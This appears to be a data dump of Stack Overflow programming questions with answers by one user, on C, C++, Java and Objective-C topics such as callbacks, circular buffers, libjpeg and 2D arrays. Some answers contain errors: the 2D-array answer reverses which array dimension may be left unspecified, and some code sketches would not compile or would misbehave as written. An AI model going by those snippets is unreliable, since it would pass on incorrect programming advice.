<p>Here is an example:</p>

<pre><code>void someDrawingFunction(....)
{
  GetContext().DrawSomething(...);
  GetContext().DrawSomething(...);
  GetContext().DrawSomething(...);
  .
  .
  .
}
</code></pre>

<p>Here is how I would do it:</p>

<pre><code>void someDrawingFunction(....)
{
  MyContext &amp;c = GetContext();
  c.DrawSomething(...);
  c.DrawSomething(...);
  c.DrawSomething(...);
  .
  .
  .
}
</code></pre>
","9530","","<p>Don't guess at where your program is spending time.  <strong>Profile first</strong> to find your bottlenecks, then optimize those.</p>

<p>As for <code>GetContext()</code>, that depends on how complex it is.  If it's just returning a class member variable, then chances are that the compiler will inline it.  If <code>GetContext()</code> has to perform a more complicated operation (such as looking up the context in a table), the compiler probably isn't inlining it, and you may wish to only call it once, as in your second snippet.</p>

<p>If you're using GCC, you can also tag the <code>GetContext()</code> function with the <a href=""http://gcc.gnu.org/onlinedocs/gcc/Function-Attributes.html#index-g%5Ft%5F0040code%5F007bpure%5F007d-function-attribute-2256"" rel=""nofollow""><code>pure</code> attribute</a>.  This will allow it to perform more optimizations, such as <a href=""http://en.wikipedia.org/wiki/Common%5Fsubexpression%5Felimination"" rel=""nofollow"">common subexpression elimination</a>.</p>
"
"<p>In the book 'Code Complete' the author talks about programming <strong>into</strong> a language (instead of programming in a language). He means, that you should not limit yourself by the restrictions of the chosen programming-language.</p>

<p>A callback is an often used feature. I'm interested: What is the most elegant way to programm callbacks into the java-language?</p>
","9530","","<p>Unfortunately, in Java, functions are not first-class objects.  The best you can do is to use an interface:</p>

<pre><code>public interface MyCallback
{
    public void theCallback(int arg);
}

public class Sample
{
    public static void takesACallback(MyCallback callback)
    {
        ...
        callback.theCallback(arg);
    }
}

public class Sample2
{
    public static void main(String[] args)
    {
        Sample.takesACallback(new MyCallback()
        {
            void theCallback(int arg)
            {
                // do a little dance
            }
        });
    }
}
</code></pre>
"
"<p>I am using the following code to get an alphabetic number of a first letter in a string:</p>

<pre><code>toupper([ my_string characterAtIndex: 0 ] ) - 'A'
</code></pre>

<p>I need to do an inverse task - to convert an alphabetical number of a letter to a NSString.</p>

<p>What is the best way to do so?</p>

<p>Thank you in advance.</p>
","9530","","<p>Use <a href=""http://developer.apple.com/documentation/Cocoa/Reference/Foundation/Classes/NSString_Class/Reference/NSString.html#//apple_ref/occ/clm/NSString/stringWithFormat%3a"" rel=""nofollow""><code>stringWithFormat:</code></a>:</p>

<pre><code>// 0 ==&gt; @""A"", 25 ==&gt; @""Z""
NSString *str = [NSString stringWithFormat:@""%c"", theCharIndex + 'A'];
</code></pre>

<p>edited to include string identifier @</p>
"
"<p>The definition of library function strspn is:</p>

<pre><code>size_t strspn(const char *str, const char *chars)

/*Return number of leading characters at the beginning of the string str which are all members of string chars.*/
</code></pre>

<p>e.g. if ‘str’ is “fecxdy” and ‘chars’ is “abcdef” then the function would return 3, since ‘f’, ’e’ and ‘c’ all appear somewhere in ‘chars’, giving 3 leading characters of ‘str’, and ‘x’ is the first character of ‘str’ which is not a member of ‘chars’.</p>

<p>Could someone help me write an implementation of strspn in ‘C’. The only library function I am allowed to call from the implementation is strlen.</p>
","9530","","<p>The basic idea is to step through the string, one character at a time, and test if it's in the character set.  If it's not, stop and return the answer.  In pseudocode, that would look like:</p>

<pre><code>count = 0
for each character c in str
    if c is not in chars
        break
    count++
return count
</code></pre>

<p>The <code>if c is not in chars</code> test can be implemented by iterating through all of the characters of <code>chars</code> and testing if <code>c</code> matches any of the characters.  Note that this is not the fastest implementation, since it involves stepping through the <code>chars</code> string for each character in <code>str</code>.  A faster implementation would use a lookup table to test if <code>c is not in chars</code>.</p>
"
"<p>Example: A function that takes a function (that takes a function (that ...) and an int) and an int.</p>

<pre><code>typedef void(*Func)(void (*)(void (*)(...), int), int);
</code></pre>

<p>It explodes recursively where <code>(...)</code>. Is there a fundamental reason this can't be done or is there another syntax? It seems to me it should be possible without a cast. I'm really trying to pass a dispatch-table but I could figure that out if I could just pass this one type.</p>
","9530","","<p>It's impossible to do directly.  Your only options are to make the function pointer argument accept unspecified arguments, or to accept a pointer to a structure containing the function pointer, as <a href=""http://stackoverflow.com/questions/816356/how-can-i-typdef-a-function-pointer-that-takes-a-function-of-its-own-type-as-an-a/816386#816386"">Dave suggested</a>.</p>

<pre><code>// Define fnptr as a pointer to a function returning void, and which takes one
// argument of type 'pointer to a function returning void and taking
// an unspecified number of parameters of unspecified types'
typedef void (*fnptr)(void (*)());
</code></pre>
"
"<p>Shouldn't be hard, right? Right?</p>

<p>I am currently trawling the OpenAFS codebase to find the header definition of pioctl. I've thrown everything I've got at it: checked ctags, grepped the source code for pioctl, etc. The closest I've got to a lead is the fact that there's a file pioctl_nt.h that contains the definition, except it's not actually what I want because none of the userspace code directly includes it, and it's Windows specific.</p>

<p>Now, I'm not expecting you to go and download the OpenAFS codebase and find the header file for me. I am curious, though: what are your techniques for finding the header file you need when everything else fails? What are the worst case scenarios that could cause a grep for pioctl in the codebase to not actually come up with anything that looks like a function definition?</p>

<p>I should also note that I have access to two independent userspace programs that have done it properly, so in theory I could do an O(n) search for the function. But none of the header files pop out to me, and n is large...</p>

<p><strong>Edit:</strong> The immediate issue has been resolved: pioctl() is defined implicitly, as shown by this:</p>

<pre><code>AFS.xs:2796: error: implicit declaration of function ‘pioctl’
</code></pre>
","9530","","<p>If <code>grep -r</code> and <code>ctags</code> are failing, then it's probably being defined as the result of some nasty macro(s).  You can try making the simplest possible file that calls <code>pioctl()</code> and compiles successfully, and then preprocessing it to see what happens:</p>

<pre><code>gcc -E test.c -o test.i
grep pioctl -C10 test.i
</code></pre>
"
"<p>I'm trying to solve the problem <a href=""http://pages.cpsc.ucalgary.ca/~johnz/ccpc/problems/A.pdf"" rel=""nofollow"">here</a> but I don't know why my code isn't working. Any help is appreciated. EDIT: Edited to make correction mentioned below, but there is still an extra ""15"" (in bold) on the second line of the output and I don't understand where it is coming from.</p>

<p>My output is </p>

<p>18662658515
5552272<b>15</b></p>

<pre><code>#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;

int main(void){
  int n;
  int j;
  scanf(""%d\n"", &amp;n);
  int i = 0;
  char mystr[15];

  for(;i&lt;n;i++){
    fgets(mystr,15,stdin);

    for(j=0;j&lt;15;j++){
      if(isdigit(mystr[j])){
        printf(""%c"", mystr[j]);
        continue;
      }
      if ('A' &lt;= mystr[j] &amp;&amp; mystr[j] &lt;= 'C')
        printf(""2"");
      if ('D' &lt;= mystr[j] &amp;&amp; mystr[j] &lt;= 'F')
        printf(""3"");
      if ('G' &lt;= mystr[j] &amp;&amp; mystr[j] &lt;= 'I')
        printf(""4"");
      if ('J' &lt;= mystr[j] &amp;&amp; mystr[j] &lt;= 'L')
        printf(""5"");
      if ('M' &lt;= mystr[j] &amp;&amp; mystr[j] &lt;= 'O')
        printf(""6"");
      if ('P' &lt;= mystr[j] &amp;&amp; mystr[j] &lt;= 'S')
        printf(""7"");
      if ('T' &lt;= mystr[j] &amp;&amp; mystr[j] &lt;= 'V')
        printf(""8"");
      if ('W' &lt;= mystr[j] &amp;&amp; mystr[j] &lt;= 'Z')
        printf(""9"");
    }
    printf(""\n"");
  }
}
</code></pre>
","9530","","<p>The problem is that you're iterating over all 15 characters in the input string, regardless of the length of the input.  The first test case has 11 characters, but the second case has only 8.  In the second iteration, you're accidentally processing the last two characters from the first input, which were <code>15</code>.</p>

<p>To fix it, just stop your iteration when you hit the NUL character 0, which terminates the string by changing this line</p>

<pre><code>for(j=0;j&lt;15;j++){
</code></pre>

<p>to</p>

<pre><code>for(j=0; mystr[j] != 0; j++){
</code></pre>
"
"<p>Hey I was wondering if there are any good tutorial out there on how to set this up? I have seen the NeHe tutorials from gamedev.net but some of them seem to be out dated... any clues?</p>

<p>thanks</p>
","9530","","<p><a href=""http://nehe.gamedev.net"" rel=""nofollow"">NeHe</a> may be a little old, but it's certainly not outdated.  Unlike DirectX, OpenGL gets updated very seldomly.  The tutorials there are still perfectly good for modern OpenGL programming.  The Visual C++ code for <a href=""http://nehe.gamedev.net/data/lessons/lesson.asp?lesson=01"" rel=""nofollow"">lesson 1</a> should work in pretty much any non-ancient version of Visual Studio, and the code for most of the samples is available in many, many languages and platforms.</p>
"
"<p>Where does glibc get its database of unicode attributes, for such functions as eg, <code>wcwidth()</code>? I'm interested in correcting a few errant entries, but I can't seem to find where this information is in its source distribution.</p>

<p>If it matters, I'm primarily interested in this under debian or ubuntu linux.</p>
","9530","","<p>I believe that it's defined in the locale definition file.  See <a href=""http://www.opengroup.org/onlinepubs/009695399/basedefs/xbd%5Fchap07.html"" rel=""nofollow"">this page</a> for more information about locales.  glibc includes a bunch of locale definitions in <code>localedate/locales</code>, although none of them seem to have any width information.</p>
"
"<p>I know its possible to get a part of a .txt, then convert it to an integer, then store it in a variable, but is it possible to to that in a single declaration. (The variable needs to be global).</p>

<p>Ie:</p>

<pre><code>[data.txt]
1020
[convert_data.cpp]
#include&lt;fstream&gt;
fstream convert(""data.txt"");
//way to declare something equal to A PARTICULAR POINT in data.txt

int main()
{
    //how would I take this block of code and simplify it to two DECLARATIONS (not
    //function calls), or, if that's not possible or not practical, how would I make
    //n and m (or var1 and var2) global AND CONSTANT?
    char var1[5];
    convert.getline(var1,2);
    char var2[5];
    convert.getline(var2,2);
    const int n=atoi(var1);
    const int m=atoi(var2);
    return 0;
}
</code></pre>
","9530","","<p>No, you can't do it in a single declaration.  You can write a function to do that, and then you can initialize local variables with that function, but you can't initialize global variables with it.  If you want to initialize global variables, you'll need to explicitly do so during your program's initialization routine, or you could do it in the constructor of a global object (not recommended).</p>
"
"<p>I want to use some C++ STL collections in my Objective-C iPhone app.  Apparently this is possible by giving files the extension "".mm"" .  What are some of the quirks/surprises associated with this?</p>

<p>I want to use the basic containers that I'm familiar with (vector, queue, set, ...)</p>

<p>Cheers!</p>
","9530","","<p>See <a href=""http://developer.apple.com/documentation/Cocoa/Conceptual/ObjectiveC/Articles/ocCPlusPlus.html"" rel=""nofollow"">Using C++ With Objective-C</a> for a detailed list of what you can and can't do.  You can do most things that you would expect.  You just can't do things like have a C++ class inherit from an Objective-C class or vice-versa, you can't mix C++ exceptions with Objective-C exceptions, and C++ introduces several new keywords not present in Objective-C.</p>
"
"<p>I have a need for a fixed-size (selectable at run-time when creating it, not compile-time) circular buffer which can hold objects of any type and it needs to be <em>very</em> high performance. I don't think there will be resource contention issues since, although it's in a multi-tasking embedded environment, it's a co-operative one so the tasks themselves can manage that.</p>

<p>My initial thought were to store a simple struct in the buffer which would contain the type (simple enum/define) and a void pointer to the payload but I want this to be as fast as possible so I'm open to suggestions that involve bypassing the heap.</p>

<p>Actually I'm happy to bypass any of the standard library for raw speed - from what I've seen of the code, it's not heavily optimized for the CPU : it looks like they just compiled C code for things like <code>strcpy()</code> and such, there's no hand-coded assembly.</p>

<p>Any code or ideas would be greatly appreciated. The operations required are:</p>

<ul>
<li>create a buffer with specific size.</li>
<li>put at the tail.</li>
<li>get from the head.</li>
<li>return the count.</li>
<li>delete a buffer.</li>
</ul>
","9530","","<p>The simplest solution would be to keep track of the item size and the number of items, and then create a buffer of the appropriate number of bytes:</p>

<pre><code>typedef struct circular_buffer
{
    void *buffer;     // data buffer
    void *buffer_end; // end of data buffer
    size_t capacity;  // maximum number of items in the buffer
    size_t count;     // number of items in the buffer
    size_t sz;        // size of each item in the buffer
    void *head;       // pointer to head
    void *tail;       // pointer to tail
} circular_buffer;

void cb_init(circular_buffer *cb, size_t capacity, size_t sz)
{
    cb-&gt;buffer = malloc(capacity * sz);
    if(cb-&gt;buffer == NULL)
        // handle error
    cb-&gt;buffer_end = (char *)cb-&gt;buffer + capacity * sz;
    cb-&gt;capacity = capacity;
    cb-&gt;count = 0;
    cb-&gt;sz = sz;
    cb-&gt;head = cb-&gt;buffer;
    cb-&gt;tail = cb-&gt;buffer;
}

void cb_free(circular_buffer *cb)
{
    free(cb-&gt;buffer);
    // clear out other fields too, just to be safe
}

void cb_push_back(circular_buffer *cb, const void *item)
{
    if(cb-&gt;count == cb-&gt;capacity)
        // handle error
    memcpy(cb-&gt;head, item, cb-&gt;sz);
    cb-&gt;head = (char*)cb-&gt;head + cb-&gt;sz;
    if(cb-&gt;head == cb-&gt;buffer_end)
        cb-&gt;head = cb-&gt;buffer;
    cb-&gt;count++;
}

void cb_pop_front(circular_buffer *cb, void *item)
{
    if(cb-&gt;count == 0)
        // handle error
    memcpy(item, cb-&gt;tail, cb-&gt;sz);
    cb-&gt;tail = (char*)cb-&gt;tail + cb-&gt;sz;
    if(cb-&gt;tail == cb-&gt;buffer_end)
        cb-&gt;tail = cb-&gt;buffer;
    cb-&gt;count--;
}
</code></pre>
"
"<p>In the name of efficiency in game programming, some programmers do not trust several C++ features. One of my friends claims to understand how game industry works, and would come up with the following remarks:</p>

<ul>
<li>Do not use smart pointers. Nobody in games does.</li>
<li>Exceptions should not be (and is usually not) used in game programming for memory and speed.</li>
</ul>

<p>How much of these statements are true? C++ features have been designed keeping efficiency in mind. Is that efficiency not sufficient for game programming? For 97% of game programming? </p>

<p>The C-way-of-thinking still seems to have a good grasp on the game development community. Is this true?</p>

<p>I watched another video of a talk on multi-core programming in GDC 2009. His talk was almost exclusively oriented towards Cell Programming, where DMA transfer is needed before processing (simple pointer access won't work with the SPE of Cell). He discouraged the use of polymorphism as the pointer has to be ""re-based"" for DMA transfer. How sad. It is like going back to the square one. I don't know if there is an elegant solution to program C++ polymorphism on the Cell. The topic of DMA transfer is esoteric and I do not have much background here. </p>

<p>I agree that C++ has also not been very nice to programmers who want a small language to hack with, and not read stacks of books. Templates have also scared the hell out of debugging. Do you agree that C++ is too much feared by the gaming community?</p>
","9530","","<p>Regarding the Cell architecture: it has an <em>incoherent</em> cache.  Each SPE has its own local store of 256 KB.  The SPEs can only access this memory; any other memory, such as the 512 MB of main memory or the local store of another SPE, has to be accessed with DMA.  You perform the DMA manually and copy the memory into your local store by explicitly initiating a DMA transfer.  This makes synchronization a huge pain.</p>

<p>Alternatively, you actually <em>can</em> access other memory.  Main memory and each SPE's local store is mapped to a certain section of the 64-bit virtual address space.  If you access data through the right pointers, the DMA happens behind the scenes, and it all looks like one giant shared memory space.  The problem?  Huge performance hit.  Every time you access one of these pointers, the SPE stalls while the DMA occurs.  This is slow, and it's not something you want to do in performance-critical code (i.e. a game).</p>

<p>This brings us to <a href=""http://stackoverflow.com/questions/829656/c-for-game-programming-love-or-distrust/829902#829902"">Skizz's point</a> about vtables and pointer fixups.  If you're blindly copying around vtable pointers between SPEs, you're going to incur a huge performance hit if you don't fix up your pointers, and you're also going to incur a huge performance hit if you <em>do</em> fix up your pointers and download the virtual function code to the SPEs.</p>
"
"<p><strong>Duplicate:</strong></p>

<blockquote>
  <p><a href=""http://stackoverflow.com/questions/58210/c-smtp-example"">c++ smtp example</a></p>
</blockquote>

<p>any suggestion libraries?</p>
","9530","","<p>I haven't used it, but <a href=""http://libsmtp.berlios.de/"" rel=""nofollow"">libsmtp</a> looks like a good start.</p>
"
"<p>I intercept a packet and extract the payload. This payload is compressed jpeg bytestream data (for example this data is assigned to <code>unsigned char *payload</code>). I know that if I have a FILE pointer, then I can use libjpeg library to extract image information. My question is there a way to pass my pointer(<code>*payload</code>) to the libjpeg functions to get the RGB values and the dimension of the image?</p>

<p>Thank you.</p>
","9530","","<p>To add to <a href=""http://stackoverflow.com/questions/832864/converting-bytestream-to-rgb-using-libjpeg/832919#832919"">Tal's answer</a>, what you should do is take a look at the implementation of the <code>jpeg_stdio_src()</code> function in <code>jdatasrc.c</code>.  The purpose of that function is to initialize the data source object, namely <code>cinfo-&gt;src</code>.  So, what you should do is the following:</p>

<ol>
<li>Create a structure (similar to the <code>my_source_mgr</code> structure in <code>jdatasrc.c</code>) which has as its first member an instance of <code>struct jpeg_source_mgr</code>.  Add any other members that you feel are necessary.  Note that we're essentially doing manual inheritance -- in C++, we would define a class that derives from <code>jpeg_source_mgr</code>, and the various function pointers declared in <code>jpeg_source_mgr</code> would instead be virtual functions.  But, we're using C, so we have to do inheritance and polymorphism the hard way.</li>
<li>Allocate space for an instance of your structure, making sure to allocate the right number of bytes, and fill out your data members.</li>
<li><p>Implement the following five functions:</p>

<ul>
<li><code>void init_source(j_decompress_ptr)</code></li>
<li><code>boolean fill_input_buffer(j_decompress_ptr)</code></li>
<li><code>void skip_input_data(j_decompress_ptr, long)</code></li>
<li><code>boolean resync_to_start(j_decompress_ptr, int)</code></li>
<li><code>void term_source(j_decompress_ptr)</code></li>
</ul>

<p>Note that for an in-memory buffer, these functions will probably be very trivial.</p></li>
<li>Finally, initialize the function pointers in your <code>jpeg_source_mgr</code> member to point to those functions.</li>
</ol>

<p>With this in place, you can then use this instead of <code>jpeg_stdio_src()</code> to initialize the data source manager, and then you should be good to go as if you were decoding a file from the file system.</p>
"
"<p>I have what I'm pretty sure is a bug in the optimizer in Visual studio 2005.  The problem is with an STL map.</p>

<p>Here's the relevant code:</p>

<pre><code>MyMapIterator myIt = m_myMap.find(otherID);

if (myIt != m_myMap.end() &amp;&amp; myIt-&gt;second.userStatus == STATUS_A)
{
	//Prints stuff.  No side-effects whatsoever.
}
else if (myIt != m_myMap.end() &amp;&amp; myIt-&gt;second.userStatus == STATUS_B &amp;&amp; myIt-&gt;second.foo == FOO_A)
{
	//Prints stuff.  No side-effects whatsoever.
}
else if (myIt != m_myMap.end() &amp;&amp; myIt-&gt;second.userStatus == STATUS_B &amp;&amp; myIt-&gt;second.foo == FOO_B &amp;&amp; /*other meaningless conditions */)
{
	//Prints stuff.  No side-effects whatsoever.
}
</code></pre>

<p>Works flawlessly in debug, used to crash in release, and disabling global optimizations ""fixed it""  Now, nothing works.  I get a:</p>

<pre><code>Microsoft Visual Studio C Runtime Library has detected a fatal error in [...]

Press Break to debug the program or Continue to terminate the program.
</code></pre>

<p>This happens on the <strong>first MyMapIterator::operator-> of the last else if</strong></p>

<p>The map is empty, I know that find should have returned end(),  The first two comparisons to that effect work. But somehow, the third time 'myIt != m_myMap.end()' returns true, and the right side of the &amp;&amp; is executed.</p>

<p>Various other places fail like this with a variant of 'myIt != m_myMap.end()' returning true in that same file, but this is, to me, the one that rules out most other possibilities.  I used to think it was a buffer overflow that was stomping on my map, but take a look back at the code.  I am positive that no other thread is stomping on it, and this is 100% reproductible.  </p>

<p>So, what do I do from here.  This is not performance sensitive in the slightest.  I just need it to work as it should.  Any option is acceptable.  Yes I know I could surround the whole thing with the iterator equality check and it isn't the nicest code.  The point is, it should still work, and if that fails, anything else can.</p>

<p><strong>EDIT</strong></p>

<p>The last else-if doesn't generate any jump !</p>

<pre><code>    if (myIt != m_myMap.end() &amp;&amp; myIt-&gt;second.userStatus == STATUS_A)
009270BE  mov         ecx,dword ptr [this] 
009270C4  add         ecx,0Ch 
009270C7  lea         eax,[ebp-90h] 
009270CD  call        std::_Tree&lt;std::_Tmap_traits&lt;unsigned __int64,lux::Foo,std::less&lt;unsigned __int64&gt;,std::allocator&lt;std::pair&lt;unsigned __int64 const ,lux::Foo&gt; &gt;,0&gt; &gt;::end (8A21E0h) 
009270D2  mov         esi,eax 
009270D4  lea         edi,[myIt] 
009270D7  call        std::_Tree&lt;std::_Tmap_traits&lt;unsigned __int64,lux::Foo,std::less&lt;unsigned __int64&gt;,std::allocator&lt;std::pair&lt;unsigned __int64 const ,lux::Foo&gt; &gt;,0&gt; &gt;::const_iterator::operator!= (8A2220h) 
009270DC  movzx       ecx,al 
009270DF  test        ecx,ecx 
009270E1  je          lux::Bar::DoStuff+0E4h (927154h) 
009270E3  lea         esi,[myIt] 
009270E6  call        std::_Tree&lt;std::_Tmap_traits&lt;unsigned __int64,lux::Foo,std::less&lt;unsigned __int64&gt;,std::allocator&lt;std::pair&lt;unsigned __int64 const ,lux::Foo&gt; &gt;,0&gt; &gt;::iterator::operator-&gt; (8A21F0h) 
009270EB  cmp         dword ptr [eax+8],1 
009270EF  jne         lux::Bar::DoStuff+0E4h (927154h) 
    {
         Stuff
    }
    else if (myIt != m_myMap.end() &amp;&amp; myIt-&gt;second.userStatus == STATUS_B)
00927154  mov         ecx,dword ptr [this] 
0092715A  add         ecx,0Ch 
0092715D  lea         eax,[ebp-98h] 
00927163  call        std::_Tree&lt;std::_Tmap_traits&lt;unsigned __int64,lux::Foo,std::less&lt;unsigned __int64&gt;,std::allocator&lt;std::pair&lt;unsigned __int64 const ,lux::Foo&gt; &gt;,0&gt; &gt;::end (8A21E0h) 
00927168  mov         esi,eax 
0092716A  lea         edi,[myIt] 
0092716D  call        std::_Tree&lt;std::_Tmap_traits&lt;unsigned __int64,lux::Foo,std::less&lt;unsigned __int64&gt;,std::allocator&lt;std::pair&lt;unsigned __int64 const ,lux::Foo&gt; &gt;,0&gt; &gt;::const_iterator::operator!= (8A2220h) 
00927172  movzx       edx,al 
00927175  test        edx,edx 
00927177  je          lux::Bar::DoStuff+17Ah (9271EAh) 
00927179  lea         esi,[myIt] 
0092717C  call        std::_Tree&lt;std::_Tmap_traits&lt;unsigned __int64,lux::Foo,std::less&lt;unsigned __int64&gt;,std::allocator&lt;std::pair&lt;unsigned __int64 const ,lux::Foo&gt; &gt;,0&gt; &gt;::iterator::operator-&gt; (8A21F0h) 
00927181  cmp         dword ptr [eax+8],2 
00927185  jne         lux::Bar::DoStuff+17Ah (9271EAh) 
    {
            //Stuff
     }
    else if (myIt != m_myMap.end() &amp;&amp; myIt-&gt;second.userStatus == STATUS_C)
009271EA  mov         ecx,dword ptr [this] 
009271F0  add         ecx,0Ch 
009271F3  lea         eax,[ebp-0A0h] 
009271F9  call        std::_Tree&lt;std::_Tmap_traits&lt;unsigned __int64,lux::Foo,std::less&lt;unsigned __int64&gt;,std::allocator&lt;std::pair&lt;unsigned __int64 const ,lux::Foo&gt; &gt;,0&gt; &gt;::end (8A21E0h) 
009271FE  mov         esi,eax 
00927200  lea         edi,[myIt] 
00927203  call        std::_Tree&lt;std::_Tmap_traits&lt;unsigned __int64,lux::Foo,std::less&lt;unsigned __int64&gt;,std::allocator&lt;std::pair&lt;unsigned __int64 const ,lux::Foo&gt; &gt;,0&gt; &gt;::const_iterator::operator!= (8A2220h) 
00927208  lea         esi,[myIt] 
0092720B  call        std::_Tree&lt;std::_Tmap_traits&lt;unsigned __int64,lux::Foo,std::less&lt;unsigned __int64&gt;,std::allocator&lt;std::pair&lt;unsigned __int64 const ,lux::Foo&gt; &gt;,0&gt; &gt;::iterator::operator-&gt; (8A21F0h) 
    {
            //Stuff in the condition and after
</code></pre>
","9530","","<p>The optimizer really messes up your debugging info.  There's a very good chance that the line that's <em>actually</em> failing on a different, nearby line.  Even if the debugger is telling you that the exception is occurring on the second half of the <code>&amp;&amp;</code> operator, it probably isn't.</p>

<p>To diagnose the real problem, you may wish the break up the last if statement into something like:</p>

<pre><code>else if (myIt != m_myMap.end())
{
    printf(""TEST 1\n"");
    if (myIt-&gt;second.userStatus == STATUS_B &amp;&amp; myIt-&gt;second-&gt;foo == FOO_B &amp;&amp; /*other meaningless conditions */)
    {
        //Prints stuff.  No side-effects whatsoever.
    }
}

printf(""TEST 2\n"");
</code></pre>

<p>If you get an output of ""TEST 1"", then there's something wrong with your iterator.  If you get an output of ""TEST 2"" and then a crash, then obviously the error is occurring in the subsequent code.  If neither ""TEST 1"" nor ""TEST 2"" prints and it still crashes there, then something is <em>really</em> wrong.</p>
"
"<p>I am working with C style 2d arrays of integers.</p>

<p>This is fine in my main class file, and I can pass my arrays by reference to other classes. I have run into issues when I try to retrieve a pointer to the arrays and work with that.</p>

<p>My question is: rather than using C style 2d arrays, is there a better way to do it? maybe a Cocoa class I don't know about? I noticed NSMatrix, but that seems geared for cells, rather than plain ints.</p>

<p>I've got calls all over the place in this format: <code>items[x][y]</code>, so a shorthand way of referencing array positions would be great.</p>

<p>Further details:</p>

<p>I set up the arrays as instance variables, and tried to access like this:</p>

<pre><code>-(void) setItems: (int [15][24])items
{
    (*pitems)[24] = **items;
}

-(int) getItems
{
    return (*pitems)[24];
}
</code></pre>

<p>When I tried to retrieve using <code>getItems</code>, I was getting compiler warnings about creating a reference without a cast.</p>
","9530","","<p>You can only pass around 2D static arrays if you know the exact size of the first dimension:</p>

<pre><code>// OK, even though we don't know the size of the second dimension
- (void) doStuff: (int [15][])array { ... }
...
int array[15][24];
[self doStuff:array];

// ERROR: don't know size of first dimension (second dimension is irrelevant)
- (void) doStuff: (int [][])array { ... }
</code></pre>

<p>Of course, then your function only works for one particular array size in the first dimension.  If you won't know the size if your first dimension until runtime, you'll have to either flatten your array into a 1D array, or use a dynamically allocated array of pointers to 1D arrays as in <a href=""http://stackoverflow.com/questions/837867/2d-arrays-of-ints-in-objective-c/837930#837930"">KiwiBastard's answer</a>.</p>
"
"<p>On pg. 109 of K&amp;R, we see:</p>

<pre><code>void writelines(char *lineptr[], int nlines)
{
  while (nlines -- &gt; 0) printf(""%s\n"", *lineptr++);
}
</code></pre>

<p>I'm confused about what *lineptr++ does exactly. From my understanding, printf requires a char pointer, so we provide that with *lineptr. Then we increment lineptr up to the next char pointer in the array? Isn't this illegal?</p>

<p>On page 99, K&amp;R writes that ""an array name is not a variable; constructions like a=pa [where a is an array, pa is a pointer to an array] and a++ are illegal.""</p>
","9530","","<p><code>lineptr</code> is not really an array; it's a pointer to a pointer.  Note that the postincrement operator <code>++</code> has higher precedence than the dereference operator <code>*</code>, so what happens in <code>lineptr++</code> is this:</p>

<ol>
<li><code>lineptr</code> gets incremented to point to the next element in the array</li>
<li>The result of <code>lineptr++</code> is the old value of <code>lineptr</code>, namely a pointer to the current element in the array</li>
<li><code>*lineptr++</code> dereferenced that, so it is the value of the current element in the array</li>
</ol>

<p>Thus, the while loop iterates over all of the elements in the array pointed to by <code>lineptr</code> (each element is a <code>char*</code>) and prints them out.</p>
"
"<p>Is it possible to check if a char has been passed into a method that requires an int?
For example, if you have some function foo(int bar) and someone uses that function like foo('t'),
are you able to find out that a char was inputted and not an int?
I know that the char is converted into an int but I am trying to limit anything other than pure integers getting through the function.</p>

<p>Cheers</p>
","9530","","<p>No, it's impossible because Java itself upgrades the <code>char</code> to an <code>int</code> if it can.</p>

<p>You could make an overload of your function that takes a <code>char</code> parameter instead of an <code>int</code> which might throw an exception, but that won't stop anyone from casting the <code>char</code> to an <code>int</code> and calling the <code>int</code> version.</p>

<p>There is absolutely no difference at all between the character constant <code>'A'</code> cast to an integer and the integer 65, so it would be completely impossible to distinguish the cases.</p>

<p><strong>Update from Pax:</strong></p>

<p>I would argue that explicit casting is NOT passing a <code>char</code>, it's the caller converting a <code>char</code> to an <code>int</code> then passing the <code>int</code>. This solution catches the inadvertent passing of a <code>char</code>.</p>

<p>Pinching someone's code from another answer, that would be:</p>

<pre><code>public class Test {
    private static void someMethod(char c) throws Exception {
        throw new Exception(""I don't think so, matey!"");
    }
    private static void someMethod(int i) {
        System.out.println(i);
    }
    public static void main(String[] args) throws Exception {
        someMethod(100);
        someMethod('d');
    }
}
</code></pre>

<p>This results in:</p>

<pre><code>100
Exception in thread ""main"" java.lang.Exception: I don't think so, matey!
    at Test.someMethod(Test.java:4)
    at Test.main(Test.java:13)
</code></pre>
"
"<p>According to <a href=""http://c-faq.com/struct/padding.html"" rel=""nofollow"">here</a>, the C compiler will pad out values when writing a structure to a binary file. As the example in the link says, when writing a struct like this:</p>

<pre><code>struct {
 char c;
 int i;
} a;
</code></pre>

<p>to a binary file, the compiler will usually leave an unnamed, unused hole between the char and int fields, to ensure that the int field is properly aligned. </p>

<p>How could I to create an exact replica of the binary output file (generated in C), using a different language (in my case, Java)?</p>

<p>Is there an automatic way to apply C padding in Java output? Or do I have to go through compiler documentation to see how it works (the compiler is g++ by the way).</p>
","9530","","<p>I highly recommend <a href=""http://code.google.com/p/protobuf/"" rel=""nofollow"">protocol buffers</a> for exactly this problem.</p>
"
"<p>Say I have:</p>

<pre><code>class A {
public:
    static void DoStuff();

    // ... more methods here ...
};
</code></pre>

<p>And later on I have a function that wants to call DoStuff:</p>

<pre><code>B::SomeFunction(A* a_ptr) {
</code></pre>

<p>Is it better to say:</p>

<pre><code>    a_ptr-&gt;DoStuff();
}
</code></pre>

<p>Or is the following better even though I have an instance pointer:</p>

<pre><code>    A::DoStuff()
}
</code></pre>

<p>This is purely a matter of style, but I'd like to get some informed opinions before I make a decision.</p>
","9530","","<p>It's better to call the static method by its name, not through an object, since it doesn't actually use that object at all.  In Java, the same problem exists.  A not-too-uncommon problem in Java is the following:</p>

<pre><code>Thread t = getSomeOtherThread();
t.sleep(1000);
</code></pre>

<p>This compiles fine but is almost always an error -- <code>Thread.sleep()</code> is a static method that causes the <em>current</em> thread to sleep, not the thread being acted on as the code seems to imply.</p>
"
"<p>Consider the following code. </p>

<p>Is DoSomething1() faster then DoSomething2() in a 1000 consecutive executions?
I would assume that if I where to call DoSomething1() it 1000 times it would be faster then calling DoSomething2() it 1000 times.</p>

<p>Is there any disadvantage to making all my large buffers static?</p>

<pre><code>#define MAX_BUFFER_LENGTH 1024*5 
void DoSomething1()
{
    static char buf[MAX_BUFFER_LENGTH] ; 
    memset( buf, 0, MAX_BUFFER_LENGTH );
}

void DoSomething2()
{
    char buf[MAX_BUFFER_LENGTH] ; 
    memset( buf, 0, MAX_BUFFER_LENGTH );
}
</code></pre>

<p>Thank you for your time. </p>
","9530","","<p>There will hardly be any speed difference at all between the two.  Allocating a buffer on the stack is very fast -- all it is is decrementing the stack pointer by a value.  If you allocate a very large buffer on the stack, though, there is a chance you could overflow your stack and cause a segfault/access violation.  Conversely, if you have a lot of static buffers, you'll increase your program's working set size considerably, although this will be mitigated somewhat if you have good locality of reference.</p>

<p>Another major difference is that stack buffers are thread-safe and reentrant, whereas static buffers are neither thread-safe nor reentrant.</p>
"
